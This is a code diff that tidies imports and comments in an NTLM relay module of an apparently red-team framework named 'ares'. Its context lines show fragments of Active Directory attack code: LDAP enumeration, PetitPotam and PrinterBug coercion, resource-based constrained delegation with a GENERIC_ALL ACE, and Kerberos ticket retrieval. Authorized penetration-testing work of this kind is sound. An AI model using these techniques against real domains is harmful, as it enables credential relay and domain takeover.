@@ -22,22 +22,20 @@ from __future__ import annotations
 
 import asyncio
 import os
-import struct
 import socket
-import time
+import struct
 import uuid
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from typing import Any
 
 from ares.core.campaign import Finding, Severity
 from ares.core.logger import audit, get_logger
 from ares.core.security import sanitize_hostname
+from ares.core.tracing import trace_module
 from ares.modules.base import BaseModule, OpsecLevel
 from ares.modules.params import NTLMRelayParams
-from ares.core.tracing import trace_module
 from ares.sdk import (
     EvidenceRecord,
-    ExecutionContext,
     LockoutCircuitBreaker,
     ModuleResult,
     NetworkPermission,
@@ -122,9 +120,9 @@ class NTLMRelayModule(BaseModule):
 
     async def validate(self, ctx: "Any") -> None:
         await super().validate(ctx)
+        from ares.core.campaign import NoiseProfile
         from ares.core.context import ExecutionContext
         from ares.core.errors import ModuleValidationError
-        from ares.core.campaign import NoiseProfile
         if not isinstance(ctx, ExecutionContext):
             return
         ad = self._extract_ad_params(ctx)
@@ -441,8 +439,9 @@ class NTLMRelayModule(BaseModule):
         """Enumerate domain computers via LDAP to build target list."""
         loop = asyncio.get_running_loop()
         def _ldap_enum():
-            import ldap3
             import ssl
+
+            import ldap3
             hosts = []
             for port, use_ssl in [(636, True), (389, False)]:
                 try:
@@ -545,8 +544,9 @@ class NTLMRelayModule(BaseModule):
             # Check LDAP signing (try unauthenticated bind to check)
             def _check_ldap(h=host):
                 try:
-                    import ldap3
                     import ssl
+
+                    import ldap3
                     tls = ldap3.Tls(validate=ssl.CERT_NONE)
                     # Try LDAPS first (636), then LDAP (389)
                     for port, use_ssl in [(389, False)]:
@@ -632,9 +632,8 @@ class NTLMRelayModule(BaseModule):
         # Method 1: PetitPotam (MS-EFSR EfsRpcOpenFileRaw)
         def _petitpotam():
             try:
-                from impacket.dcerpc.v5 import transport, epm
-                from impacket.dcerpc.v5.ndr import NDRCALL
                 from impacket import uuid as imp_uuid
+                from impacket.dcerpc.v5 import transport
 
                 # MS-EFSR UUID
                 MSEFSR_UUID = imp_uuid.uuidtup_to_bin(
@@ -683,7 +682,7 @@ class NTLMRelayModule(BaseModule):
         # Method 2: PrinterBug (MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx)
         def _printerbug():
             try:
-                from impacket.dcerpc.v5 import transport, rprn
+                from impacket.dcerpc.v5 import rprn, transport
 
                 rpct = transport.DCERPCTransportFactory(
                     f"ncacn_np:{source}[\\pipe\\spoolss]"
@@ -778,13 +777,13 @@ class NTLMRelayModule(BaseModule):
             dacl_modified = False
 
             try:
-                from impacket.ldap import ldap as imp_ldap
-                from impacket.ldap import ldapasn1 as ldapasn1_impacket
+                import ssl
 
                 # Step 1: Bind via LDAP
                 import ldap3
-                import ssl
-                tls = ldap3.Tls(validate=ssl.CERT_NONE)
+                from impacket.ldap import ldap as imp_ldap  # noqa: F401
+                from impacket.ldap import ldapasn1 as ldapasn1_impacket  # noqa: F401
+                tls = ldap3.Tls(validate=ssl.CERT_NONE)  # noqa: F841
                 server = ldap3.Server(dc, port=389, connect_timeout=10)
                 conn = ldap3.Connection(
                     server, user=f"{domain.upper()}\\{username}",
@@ -935,7 +934,7 @@ class NTLMRelayModule(BaseModule):
                 loop.run_in_executor(None, _rbcd_chain),
                 timeout=120,
             )
-        except asyncio.TimeoutError:
+        except TimeoutError:
             return RBCDResult(
                 target_host=target_host, machine_account=machine_name,
                 machine_password=machine_pass,
@@ -952,7 +951,7 @@ class NTLMRelayModule(BaseModule):
         """
         # ACE: ACCESS_ALLOWED_ACE (type=0, flags=0, mask=GENERIC_ALL)
         ace_mask = struct.pack("<I", 0x000F01FF)  # GENERIC_ALL equivalent
-        ace_body = struct.pack("<B", 0x00)   # type: ACCESS_ALLOWED
+        ace_body = struct.pack("<B", 0x00)   # ACE type byte: ACCESS_ALLOWED
         ace_body += struct.pack("<B", 0x00)  # flags
         ace_size = 8 + len(machine_sid)
         ace_body += struct.pack("<H", ace_size)
@@ -984,11 +983,13 @@ class NTLMRelayModule(BaseModule):
         Returns path to .ccache file, or empty string on failure.
         """
         try:
-            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
-            from impacket.krb5.types import Principal
+            import os
+
             from impacket.krb5 import constants
             from impacket.krb5.ccache import CCache
-            import os
+            from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
+            from impacket.krb5.types import Principal
+
             from ares.core.security import secure_mkstemp
 
             domain_upper = domain.upper()
